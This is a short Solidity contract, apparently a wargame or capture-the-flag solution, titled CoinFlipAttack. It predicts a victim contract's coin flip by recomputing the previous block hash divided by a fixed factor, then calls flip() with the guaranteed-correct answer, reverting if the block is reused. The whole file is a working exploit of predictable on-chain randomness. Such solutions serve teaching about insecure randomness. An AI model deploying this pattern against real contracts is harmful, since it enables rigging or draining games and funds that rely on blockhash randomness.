// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}



contract CoinFlipAttack {

  ICoinFlip  public coinflip;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  uint256 lastHash;
  constructor(address victim) {
    coinflip = ICoinFlip(victim);
  }

  function attack() public returns (bool success) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    success = coinflip.flip(side);
    
  }
}